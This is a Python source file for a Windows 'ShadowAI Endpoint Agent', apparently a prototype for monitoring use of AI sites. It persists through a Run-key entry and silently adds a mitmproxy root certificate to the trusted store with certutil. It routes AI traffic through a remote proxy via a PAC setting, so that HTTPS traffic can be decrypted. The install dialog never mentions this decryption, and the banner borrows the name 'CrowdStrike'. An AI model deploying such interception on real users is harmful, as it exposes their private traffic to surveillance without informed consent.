import os
import sys
import platform
import urllib.request
import json
import time
import threading
import shutil
import ctypes

try:
    import pystray
    from PIL import Image, ImageDraw
    HAS_TRAY = True
except ImportError:
    HAS_TRAY = False

# Configuration
SERVER_IP = "192.168.89.132"
API_URL = f"http://{SERVER_IP}:5000/register"
PAC_URL = f"http://{SERVER_IP}:5000/proxy.pac"
# Use AppData - NO Admin permission required!
INSTALL_DIR = os.path.join(os.environ.get("APPDATA", "C:\\Users\\Public"), "ShadowAI")
INSTALL_PATH = os.path.join(INSTALL_DIR, "ShadowAI_Agent.exe")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

def ask_install():
    MB_YESNO = 0x04
    MB_ICONQUESTION = 0x20
    IDYES = 6
    result = ctypes.windll.user32.MessageBoxW(0, "Do you want to install ShadowAI Endpoint Security?", "ShadowAI Installer", MB_YESNO | MB_ICONQUESTION)
    return result == IDYES

def install_persistence(exe_path):
    if platform.system() != "Windows":
        return
    import winreg
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ShadowAI_Endpoint_Agent", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        print(f"[+] Persistence Installed! Auto-start from: {exe_path}")
    except Exception as e:
        print(f"[-] Failed to install persistence: {e}")

def run_installer_flow():
    if platform.system() != "Windows":
        return

    # Get current exe path
    if getattr(sys, 'frozen', False):
        current_exe = sys.executable
    else:
        current_exe = os.path.abspath(__file__)

    # If already running from the installed location, skip installer
    if current_exe.lower() == INSTALL_PATH.lower():
        return

    # Ask user if they want to install (NO UAC needed!)
    if ask_install():
        os.makedirs(INSTALL_DIR, exist_ok=True)
        try:
            shutil.copy2(current_exe, INSTALL_PATH)
        except Exception as e:
            ctypes.windll.user32.MessageBoxW(0, f"Installation failed: {e}", "ShadowAI Error", 0x10)
            sys.exit(1)
        
        install_persistence(INSTALL_PATH)
        
        ctypes.windll.user32.MessageBoxW(0, "Installation Successful!\n\nShadowAI is now securing this endpoint.\nLook for the icon in your Taskbar.", "ShadowAI", 0x40)
        ctypes.windll.shell32.ShellExecuteW(None, "open", INSTALL_PATH, "", None, 1)
        sys.exit(0)
    else:
        sys.exit(0)

def get_windows_username():
    try:
        return os.getlogin()
    except:
        return os.environ.get("USERNAME", "Unknown_User")

def register_agent(ip_address, username):
    print(f"[*] Registering Agent identity with ShadowAI Server...")
    data = json.dumps({"ip": ip_address, "username": username}).encode("utf-8")
    req = urllib.request.Request(API_URL, data=data, headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req) as response:
            res = json.loads(response.read().decode())
            print(f"[+] Registration Success! Assigned Role: {res.get('role')}")
    except Exception as e:
        print(f"[-] Registration failed: {e}")

def install_mitmproxy_cert():
    """Auto-download and silently install the mitmproxy CA cert into Windows Trusted Root store."""
    if platform.system() != "Windows":
        return
    try:
        CERT_URL = f"http://{SERVER_IP}:5000/cert"
        cert_dir = os.path.join(os.environ.get("APPDATA", "C:\\Users\\Public"), "ShadowAI")
        os.makedirs(cert_dir, exist_ok=True)
        cert_path = os.path.join(cert_dir, "ShadowAI_CA.cer")

        # Download cert from Ubuntu server
        with urllib.request.urlopen(CERT_URL, timeout=5) as resp:
            cert_data = resp.read()
        with open(cert_path, "wb") as f:
            f.write(cert_data)

        # Silently install into Trusted Root store using certutil (no popup!)
        import subprocess
        result = subprocess.run(
            ["certutil", "-addstore", "-f", "ROOT", cert_path],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print("[+] ShadowAI CA Certificate installed successfully!")
        else:
            print(f"[-] Cert install warning: {result.stderr.strip()}")
    except Exception as e:
        print(f"[-] Certificate auto-install failed: {e}")

def set_windows_pac():
    if platform.system() != "Windows":
        return
    import winreg
    import ctypes
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "AutoConfigURL", 0, winreg.REG_SZ, PAC_URL)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        internet_set_option = ctypes.windll.wininet.InternetSetOptionW
        internet_set_option(0, 39, 0, 0)
        internet_set_option(0, 37, 0, 0)
    except Exception as e:
        print(f"[-] Failed to set Windows proxy: {e}")

def get_local_ip():
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def create_tray_image():
    # Try to load the real logo if it exists (either bundled by PyInstaller or next to script)
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
        
    logo_path = os.path.join(base_path, "logo.png")
    
    try:
        if os.path.exists(logo_path):
            img = Image.open(logo_path)
            img = img.convert("RGBA")  # pystray on Windows REQUIRES RGBA
            img = img.resize((64, 64), Image.LANCZOS)
            return img
    except Exception as e:
        print(f"[-] Failed to load logo.png: {e}")

    # Fallback: Generate a programmatic icon in RGBA mode
    image = Image.new('RGBA', (64, 64), color=(30, 30, 30, 255))
    dc = ImageDraw.Draw(image)
    dc.ellipse((8, 8, 56, 56), fill=(0, 180, 255, 255))  # Cyan circle
    dc.ellipse((20, 20, 44, 44), fill=(30, 30, 30, 255))  # Dark inner circle
    return image

def exit_action(icon, item):
    icon.stop()
    sys.exit(0)

def run_tray_icon(username, local_ip):
    if not HAS_TRAY:
        try:
            while True:
                time.sleep(60)
                register_agent(local_ip, username)
        except KeyboardInterrupt:
            pass
        return

    def background_ping():
        while True:
            time.sleep(60)
            register_agent(local_ip, username)
            
    threading.Thread(target=background_ping, daemon=True).start()

    menu = pystray.Menu(
        pystray.MenuItem(f'User: {username}', lambda: None),
        pystray.MenuItem('Status: Securing AI Traffic', lambda: None),
        pystray.MenuItem('Exit ShadowAI', exit_action)
    )
    
    icon = pystray.Icon("ShadowAI", create_tray_image(), "ShadowAI Endpoint Agent", menu)
    
    # CRITICAL FIX: pystray on Windows requires explicitly setting visible=True
    # Without this, the icon is created but hidden in the tray!
    def setup(icon):
        icon.visible = True
    
    icon.run(setup=setup)

def main():
    # 0. RUN INSTALLER FLOW (Requests Admin & GUI Popup)
    run_installer_flow()

    print("==================================================")
    print("      ShadowAI Endpoint Agent (CrowdStrike)       ")
    print("==================================================")
    
    username = get_windows_username()
    local_ip = get_local_ip()
    
    # 1. Register with Dashboard Server
    register_agent(local_ip, username)

    # 2. Auto-install mitmproxy CA cert so ALL HTTPS AI traffic is decrypted (Grok, Perplexity, etc.)
    install_mitmproxy_cert()
    
    # 3. Configure Windows to route ONLY AI traffic to mitmproxy
    set_windows_pac()
    
    # Run the System Tray Icon (This keeps the program alive)
    run_tray_icon(username, local_ip)


if __name__ == "__main__":
    main()
